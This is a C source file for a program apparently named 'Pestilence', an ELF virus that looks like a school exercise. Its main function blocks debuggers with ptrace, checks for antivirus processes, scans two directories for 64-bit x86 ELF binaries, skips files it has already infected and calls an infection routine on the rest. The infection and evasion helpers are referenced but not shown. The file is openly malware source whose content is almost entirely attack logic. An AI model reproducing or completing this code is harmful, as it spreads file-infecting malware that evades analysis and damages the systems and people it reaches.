#include "../incl/pestilence.h"

int     ft_readelf(t_pestilence *pestilence)
{
    pestilence->elf = mmap(NULL, pestilence->file_info.st_size, PROT_READ, MAP_PRIVATE, pestilence->fd, 0);
    if (pestilence->elf == MAP_FAILED)
    {
        close(pestilence->fd);
        return (-1);
    }
    if (pestilence->file_info.st_size >= 4 && pestilence->elf[0] == 0x7f && pestilence->elf[1] == 'E' && pestilence->elf[2] == 'L' && pestilence->elf[3] == 'F')
    {
        pestilence->file_size = pestilence->file_info.st_size;
        pestilence->header = (Elf64_Ehdr *)pestilence->elf;
        if ((pestilence->header->e_ident[EI_CLASS] == ELFCLASS64) && pestilence->header->e_machine == EM_X86_64)
            return (0);
        else
        {
            close(pestilence->fd);
            return (-1);
        }
    }
    else
    {
        close(pestilence->fd);
        return (-1);
    }
    return (0);
}

int     ft_checkarg(t_pestilence *pestilence)
{
    pestilence->fd = open(pestilence->binary, O_RDONLY);
    if (pestilence->fd == -1)
        return (errno == EISDIR ? -2 : -1);
    if (fstat(pestilence->fd, &pestilence->file_info) == -1)
    {
        close(pestilence->fd);
        return (-1);
    }
    if (S_ISDIR(pestilence->file_info.st_mode))
    {
        close(pestilence->fd);
        return (-1);
    }
    return(ft_readelf(pestilence));
}

int main()
{
    t_pestilence    *pestilence;
    char            path[1024];
    int             i = 0;

    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
        exit (1);
    pestilence = malloc(sizeof(t_pestilence));
    if (!pestilence)
        return (1);
    pestilence->anti_virus = 0;
    ft_antiprocess(pestilence);

    if (!pestilence->anti_virus)
    {
        while (i < 2)
        {
            pestilence->dir = opendir(ft_getdir(i));
            if (pestilence->dir)
            {
                while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
                {
                    snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
                    if (pestilence->readdir->d_name[0] == '.')
                        continue;
                    pestilence->binary = path;
                    if (ft_checkarg(pestilence))
                        continue;
                    pestilence->sectab = (Elf64_Shdr *)(pestilence->elf + pestilence->header->e_shoff);
                    pestilence->strtab = (char *)(pestilence->elf + pestilence->sectab[pestilence->header->e_shstrndx].sh_offset);
                    if (ft_detect_prev_infection(pestilence))
                        ft_infect(pestilence);
                }
            }
            closedir(pestilence->dir);
            i++;
        }
    }
    free(pestilence);
    return (0);
}